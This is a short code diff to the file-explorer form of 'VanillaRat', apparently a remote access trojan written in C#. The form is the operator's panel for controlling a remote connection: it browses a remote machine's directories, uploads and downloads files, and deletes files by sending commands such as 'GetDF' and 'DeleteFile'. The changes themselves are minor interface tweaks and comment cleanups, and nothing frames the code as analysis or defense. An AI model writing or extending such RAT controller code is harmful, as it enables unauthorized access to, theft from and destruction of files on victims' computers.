@@ -14,11 +14,15 @@ namespace VanillaRat.Forms
         public FileExplorer()
         {
             InitializeComponent();
+            MinimizeBox = false;
+            MaximizeBox = false;
+            Update = true;
         }
 
         public int ConnectionID { get; set; }
+        public bool Update { get; set; }
 
-        //Switch directory if directory is selected 
+        //Switch directory if directory is selected
         private void lbFiles_SelectedIndexChanged_1(object sender, EventArgs e)
         {
             if (lbFiles.SelectedItems.Count == 0)
@@ -58,7 +62,7 @@ namespace VanillaRat.Forms
             Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("GetDF{" + txtCurrentDirectory.Text + "}"));
         }
 
-        //Manual directory input 
+        //Manual directory input
         private void txtCurrentDirectory_TextChanged(object sender, EventArgs e)
         {
             if (txtCurrentDirectory.Text.Length < 3)
@@ -74,7 +78,7 @@ namespace VanillaRat.Forms
             Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("GoUpDir"));
         }
 
-        //Refresh listed files and directories 
+        //Refresh listed files and directories
         private void btnRefresh_Click(object sender, EventArgs e)
         {
             if (txtCurrentDirectory.Text.Length < 3)
@@ -118,7 +122,7 @@ namespace VanillaRat.Forms
             TempDataHelper.CanDownload = false;
         }
 
-        //Upload file 
+        //Upload file
         private void btnUpload_Click(object sender, EventArgs e)
         {
             OpenFileDialog OFD = new OpenFileDialog();
@@ -212,6 +216,12 @@ namespace VanillaRat.Forms
             Server.MainServer.Send(ConnectionID,
                 Encoding.ASCII.GetBytes("DeleteFile{" + txtCurrentDirectory.Text + @"\" + Item.SubItems[0].Text +
                                         Item.SubItems[1].Text + "}"));
+        }
+
+        //On form close
+        private void FileExplorer_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            Update = false;
         }
     }
 }
